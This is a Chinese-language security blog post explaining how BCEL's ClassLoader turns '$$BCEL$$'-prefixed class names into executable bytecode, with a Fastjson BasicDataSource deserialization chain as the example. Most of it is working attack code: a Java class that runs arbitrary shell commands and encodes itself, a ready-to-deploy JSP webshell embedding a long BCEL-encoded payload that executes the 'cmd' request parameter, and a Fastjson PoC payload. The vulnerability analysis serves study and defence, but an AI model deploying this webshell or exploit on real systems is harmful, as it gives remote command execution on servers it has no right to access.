---
title: BCEL类加载机制（以Fastjson BasicDataSource为例）
date: 2022-7-30
tags:
 - Vulnerabilities
 - 笔记
categories:
 - Vulnerabilities
---

### BCEL攻击原理

当BCEL的com.sun.org.apache.bcel.internal.util.ClassLoader#loadClass加载一个类名中带有$$BCEL$$的类时会截取出$$BCEL$$后面的字符串，然后使用com.sun.org.apache.bcel.internal.classfile.Utility#decode将字符串解析成类字节码（带有攻击代码的恶意类），最后会调用defineClass注册解码后的类，一旦该类被加载就会触发类中的恶意代码。

### 利用

```java
import com.sun.org.apache.bcel.internal.classfile.Utility;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;

public class BcelEvil {

    String res;

    public BcelEvil(String cmd) throws IOException {
        StringBuilder stringBuilder = new StringBuilder();
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));
        String line;
        while((line = bufferedReader.readLine()) != null) {
            stringBuilder.append(line).append("\n");
        }
        res = stringBuilder.toString();
    }

    @Override
    public String toString() {
        return res;
    }

    public static void main(String[] args) throws IOException {
        InputStream inputStream = BcelEvil.class.getClassLoader().getResourceAsStream("BcelEvil.class");
        byte[] bytes = new byte[inputStream.available()];
        inputStream.read(bytes);
        String code = Utility.encode(bytes, true);
        System.out.println("$$BCEL$$" + code);
    }
}

```

也就是说我们在利用的时候，可以构造$$BCEL$$后面跟上一串恶意类加密后的字符串，那么按照BCEL的机制，它会先把它解密成上面恶意类的样子，然后调用defineClass注册该恶意类，也就触发了恶意代码

```jsp
<%@ page import="com.sun.org.apache.bcel.internal.util.ClassLoader" %>
<html>
<body>
<h2>BCEL字节码的JSP Webshell</h2>
<%
    String bcelCode = "$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$85U$5bW$hU$U$fe$86$ML$Y$86B$93R$$Z$bcQ$hn$j$ad$b7Z$w$da$mT4$5c$84$W$a4x$9bL$Oa$e8d$sN$s$I$de$aa$fe$86$fe$87$beZ$97$86$$q$f9$e8$83$8f$fe$M$7f$83$cb$fa$9dI$I$89$84$e5$ca$ca$3es$f6$de$b3$f7$b7$bf$bd$cf$99$3f$fe$f9$e57$A$_$e3$7b$jC$98$d6$f0$a6$8e6$b9$be$a5$e1$86$8e4f$a4x$5b$c7$y$e6t$b4$e3$a6$O$V$efH1$_$j$df$8d$e3$3d$b9f$3a$d1$8b$F$N$8b$3a$96$b0$i$c7$fb$3aV$b0$aa$e3$WnK$b1$a6c$j$ltb$Dw$e2$d8$d4$f1$n$3e$d2$f0$b1$82X$mJ$K$S$99$jk$d72$5d$cb$cb$9b$aba$e0x$f9$v$F$j$d7$j$cf$J$a7$V$f4$a5N$9aG$d7$U$a83$7eN$u$e8$c98$9eX$y$X$b2$o$b8ee$5d$n$c3$f9$b6$e5$aeY$81$p$f75$a5$gn$3bL$a5g$d2$b6pgw$j$97$vbv$n$a7$a0$bb$U$c5L$97$j7$t$C$F$83$t$d2$d5L$7c$e3L$b6$bc$b5$r$C$91$5b$RV$e4$3cPuv$7c3$ddd$a1$af$ea$S$Y$c3$af$86$96$7dw$c1$wF$40$c8$90$86O$c82$J$s$9a$d9$3d$5b$UC$c7$f7J$g$3eU$Q$P$fdjF$F$e7R$a3$adXQ$L$96$e3$v8$9f$da$3c$85$U$x$c8$b3$ccd$L$b3$82$$$c7$x$96Cn$85U$m$afu$e8$f3$c7jz$b5g$f7C$d9$95$b6$cd4$e3$d9$R$c9$fa$aa_$Ol1$e7H$w$bb$8f$u$bc$y$D$Y$b8$AKA$ff$v$a4$Rkk$86Ht$8b$fcU$9b$86$ac$B$h9$D$C$5b$g$f2$G$b6$e1$c8D$3bR$dc5$e0$e2$8a$81$C$c8$84$a2$hxQ$ee$9e$c0$93$q$f0$I$9a$G$df$40$R$9f$b1eu$b4$b6k$95$c8s$60$a0$84PC$d9$c0$$$3e7$b0$87$7d$N_$Y$f8$S_i$f8$da$c07$b8$c7$40$p$p$e9$99$d9$cc$c8$88$86o$N$7c$87a$F$bd$c7$V$$ew$84$j6$a9$8e$fa$96$ac$X$b5To$$$t$z$r$9bs$f6$d8$7d$a5$ec$85NA2$9b$Xa$7d$d3$d7$d4$f4$9aZv$5d$ec$J$5b$c1$a5V$t$a1A$b5$i$f8$b6$u$95$a6$9a2$d5$94$q$82$99$e6$h$H$a0$ff$u$db$89$R$YH$b54$c8$g$92$c7$a6$da$a4Km$9c$f6$5c$s$9a$f7$O$abX$U$k$cf$d5$e4$ff$a0$fd$ef$d9$ea96$cd$c8NU$RG$8f$Z$bf61M$fc4$98$f8z_K$D$BK$82E$v$9a$df$h$a5$a3$daGO$Hw$82$8dd$L$b5$82N$w$j$b7z$b9$b0$bd$f3$ec$92$q$81$e7$t$b5$99$96$db$x$b6_0Ke$cf$f4$83$bci$V$z$7b$5b$98Y$ce$a2$e9x$a1$I$3c$cb5$a3$81$dc$e2$992o$87$8e$eb$84$fbdOx$d5$T$d7$cf$uwZ$5e$B$8dC$b7_$K$F$b1$c4$fcr$d8x$a0$97$e9$da$C$7f$83Z$81V$94$3b$d7$c33$bc$b9$87$f8$JP$f8$e7$n$a2$8c$f1$f9$C$86y$ad$3f$c5$dd$9f$e8$e0$bd$P$dc$i$3b$80r$88$b6$8d$D$c4$W$O$a1n$i$a2$7d$e3$R$3a$c6$x$d0$w$88$l$a0$f3$A$fa$e2d$F$5d$h$d7$d4$df$91$98$YT$x0$S$dd$U$eb$P$k$ff56Q$c1$99$9f$d1$f30J$f04$e504$ca$$$7eJ$M$fe$baq$R$3d0$Jf$g$J$cc$nI$60$f2$bb$U$a5$c6$b3x$O$88$9eF$IQ$a1$ff$U$fd$9f$t$c4$8b$b4$5dB$8a1$t$I$7f$94V$VcQ$vm$8fiT5$8ck$98$d00$a9$e12$f07$G$b8c$g$d0M$c1$L$fc$f3$f6$a0$94$95$9a$5c$r$L$edc$3f$a1$e7$H$3e$b4E8$3b$oe$7f$84$c7$a8$3a$d4$f0t$e2$r$o$ac$d2t$9f$IT$aeW$T$bd$V$9cM$q$wHfH$cd$b9_$e3$L$e3$y$bdo$7dB$7d$84$f3$8b$3f$a2$bf$c6ab$80$cc$90$$$83$bcT0$f8$b0$9eo$88$Z$r$fe$$$d6$92$60$p$G$c8$d40s$bcF$ab$c40V$cd$83W$f0j$c4$df$q$zW$89$xA$3e$5e$c75F$Zf$8c$v$be$jk$w$f4z$94$e1$8d$7f$BP$cbmH$f2$H$A$A";
    response.getOutputStream().write(String.valueOf(new ClassLoader().loadClass(bcelCode).getConstructor(String.class).newInstance(request.getParameter("cmd")).toString()).getBytes());
%>
</body>
</html>
```

### 举个例子

以fastjson为例，有一条poc如下：

```json
{
    {
        "@type": "com.alibaba.fastjson.JSONObject",
        "x":{
                "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
                "driverClassLoader": {
                    "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
                },
                "driverClassName": "$$BCEL$$$l$8b$I$A$..."
        }
    }: "x"
}
```

利用链为：

```
BasicDataSource.getConnection() -> createDataSource() -> createConnectionFactory()
```

```java
protected ConnectionFactory createConnectionFactory() throws SQLException {

    ...

    if (driverClassLoader == null) {
            driverFromCCL = Class.forName(driverClassName);
    } else {
            driverFromCCL = Class.forName(driverClassName, true, driverClassLoader);
    }
    ...
```

经过一连串的调用链，在 BasicDataSource.createConnectionFactory() 中会调用 Class.forName()，还可以自定义ClassLoader。Class.forName() 在动态加载类时，默认会进行初始化，所以这里在动态加载的过程中会执行 static 代码段。

接下来看poc中另外两个字段，com.sun.org.apache.bcel.internal.util.ClassLoader 会直接从className中提取class的bytecode数据

```java
protected Class loadClass(String class_name, boolean resolve) throws ClassNotFoundException
{
    ...

    if(class_name.indexOf("$$BCEL$$") >= 0)
          clazz = createClass(class_name);
    else { 
      ...
    }

    if(clazz != null) {
      byte[] bytes  = clazz.getBytes();
      cl = defineClass(class_name, bytes, 0, bytes.length);
    } else
      cl = Class.forName(class_name);

        ....

    return cl;
}

/*
* The name contains the special token $$BCEL$$. Everything before that
* token is consddered to be a package name. You can encode you own
* arguments into the subsequent string. 
* The default implementation interprets the string as a encoded compressed
* Java class, unpacks and decodes it with the Utility.decode() method, and
* parses the resulting byte array and returns the resulting JavaClass object.
*
* @param class_name compressed byte code with "$$BCEL$$" in it
*/
protected JavaClass createClass(String class_name) {
    ...
}
```

如果 classname 中包含 `$$BCEL$$` ，这个 ClassLoader 则会将`$$BCEL$$`后面的字符串按照BCEL编码进行解码，作为Class的字节码，并调用 defineClass() 获取 Class 对象。

于是我们通过FastJson反序列化，反序列化生成一个 org.apache.tomcat.dbcp.dbcp2.BasicDataSource 对象，并将它的成员变量 classloader 赋值为 com.sun.org.apache.bcel.internal.util.ClassLoader 对象，将 classname 赋值为经过BCEL编码的字节码（假设对应的类为Evil.class），我们将需要执行的代码写在 Evil.class 的 static 代码块中即可。